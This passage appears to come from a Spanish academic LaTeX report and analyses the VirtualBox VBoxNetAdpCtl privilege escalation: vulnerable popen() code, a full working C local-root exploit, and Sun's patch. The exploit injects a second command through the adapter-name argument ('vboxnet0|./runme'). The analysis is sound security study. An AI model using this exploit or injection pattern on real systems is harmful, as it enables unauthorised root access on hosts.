@@ -1,1 +1,148 @@
 \section{Vulnerabilidades}
+
+En esta secci'on se van a discutir y analizar las principales vulnerabilidades encontradas en los 3 entornos de virtualizacion mas importantes como son VMWare, Sun VirtualBox y Microsoft VirtualPc.
+
+\subsection{VirtualBox VBoxNetAdpCtl Privilege Escalation}
+
+Esta vulnerabilidad reportada el 17 de Octubre del 2009 por Thomas Biege de SUSE Linux y patcheada por Sun el 17 de diciembre de este año explota un error en el uso de la funcion popen(). 
+A continuacion se ve el codigo vulnerable:
+
+%\lstset{language=C++, caption=Descriptive Caption Text, label=DescriptiveLabel}
+\begin{verbatim}
+#define VBOXADPCTL_IFCONFIG_PATH "/sbin/ifconfig"
+    ...
+static bool removeAddresses(const char *pszAdapterName)
+{
+    char szCmd[1024], szBuf[1024];
+    char aszAddresses[MAX_ADDRESSES][MAX_ADDRLEN];
+
+    memset(aszAddresses, 0, sizeof(aszAddresses));
+    snprintf(szCmd, sizeof(szCmd), VBOXADPCTL_IFCONFIG_PATH " %s", pszAdapterName);
+    FILE *fp = popen(szCmd, "r");
+
+    if (!fp)
+        return false;
+    ...
+    return true;
+}
+    ...
+int main(int argc, char *argv[])
+{
+    const char *pszAdapterName;
+    ...
+           pszAdapterName = argv[1];
+    ...
+    if (fRemove)
+    ...
+   }
+   else
+   {
+        /* We are setting/replacing address. */
+    ...
+            if (!removeAddresses(pszAdapterName))
+    ...
+   return rc;
+}
+\end{verbatim}
+
+En el main de este modulo se ejecuta removeAddresses con el parametro pszAdapterName que viene de parametros de usuario. Una vez dentro de la funcion removeAddresses, se crea un path de la forma “/sbin/ifconfig DEVICE”, pero al ser el parametro con el que realiza el format string controlado por el usuario, el atacante puede ingresar con un pipe otros comandos a ser ejecutado por el shell con los privilegios de VBoxNetAdpCtl, que esta instalada como SUID root por defecto en varios sistemas operativos. Por lo tanto, el atacante gana privilegio de root en el host y de esta manera tiene privilegios para modificar los guest o el hypervisor.
+
+Un exploit para la siguiente vulnerabilidad es el siguiente:
+
+\begin{verbatim}
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/utsname.h>
+ 
+int main(int argc,char* argv[])
+{
+        char *env[] = {NULL};
+    int platform, machine = 0;
+    struct utsname* sysdetail = malloc(sizeof(struct utsname));
+    printf("[ Sun VirtualBox <= 3.0.6 OSX/SOL/LINUX local root exploit\n");
+    if(argc > 1){
+        printf("[ Trying %s\n", argv[1]);
+        execle(argv[1],argv[1],"vboxnet0|./runme","1::2",NULL,env);
+        exit(0);
+    }
+    else{
+        printf("[ No path provided, will attempt to exploit system default\n");
+    }
+    printf("[ Places a root shell in ./sh if succesful\n");
+    uname(sysdetail);
+    if(!strncmp("Darwin",sysdetail->sysname,strlen("Darwin")))
+        platform = 1;
+    if(!strncmp("SunOS",sysdetail->sysname,strlen("SunOS")))
+        platform = 2;
+    if(!strncmp("Linux",sysdetail->sysname,strlen("Linux")))
+        platform = 3;
+    switch(platform){
+        case 1:
+            printf("[ Detected a Mac OS X target\n");
+            execle("/Applications/VirtualBox.app/Contents/MacOS/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
+            break;
+        case 2:
+            printf("[ Detected a SunOS target\n");
+            if(!strncmp("i86pc",sysdetail->machine,strlen("i86pc"))){
+                printf("[ Detected SunOS is x86 platform\n");
+                execle("/opt/VirtualBox/i386/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
+            }
+            else{
+                printf("[ Guessing SunOS is amd64 platform\n");
+                execle("/opt/VirtualBox/amd64/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
+            }
+            break;
+        case 3:
+            printf("[ Detected a Linux target\n");
+            execle("/opt/VirtualBox/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
+            break;
+        default:
+            printf("[ Unknown OSE target. Try ./%s <path>/VBoxNetAdpCtl\n",argv[0]);
+            break;
+    }
+        exit(0);
+}
+\end{verbatim}
+
+Este codigo realiza la llamada a la aplicaci'on VBoxNetAdpCtl, previo chequeo de que sistema operativo se encuentre corriendo la maquina en ese momento. Esto impacta en el path al que se ataca, aunque se puede setear por los parametros del exploit.
+
+En la linea
+
+\begin{verbatim}
+execle("/opt/VirtualBox/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
+\end{verbatim}
+
+se ve que se esta ejecutando $VBoxNetAdpCtl$ con el parametro $vboxnet0|./runme$, lo que va a resultar que el programa termine ejecutando
+
+\begin{verbatim}
+popen(/sbin/ifconfig vboxnet0|./runme)
+\end{verbatim}
+
+runme es un programa que recibe parametros por consola para ejecutar, pero puede ser cambiado por cualquier otro para el uso del atacante.
+
+El patch que aplico la gente de Sun fue el siguiente:
+
+\begin{verbatim}
+int checkAdapterName(const char *pcszNameIn, char *pszNameOut)
+{
+    int iAdapterIndex = -1;
+
+    if (   strlen(pcszNameIn) >= VBOXNETADP_MAX_NAME_LEN
+        || sscanf(pcszNameIn, "vboxnet%d", &iAdapterIndex) != 1
+        || iAdapterIndex < 0 || iAdapterIndex > 99 )
+    {
+        fprintf(stderr, "Setting configuration for %s is not supported.\n", pcszNameIn);
+        return ADPCTLERR_BAD_NAME;
+    }
+    sprintf(pszNameOut, "vboxnet%d", iAdapterIndex);
+    if (strcmp(pszNameOut, pcszNameIn))
+    {
+        fprintf(stderr, "Invalid adapter name %s.\n", pcszNameIn);
+        return ADPCTLERR_BAD_NAME;
+    }
+
+    return 0;
+}
+\end{verbatim}
+
+Se reemplazo la llamada peligrosa al popen por execve y se agregaron nuevos chequeos basicos sobre el argumento de entrada.
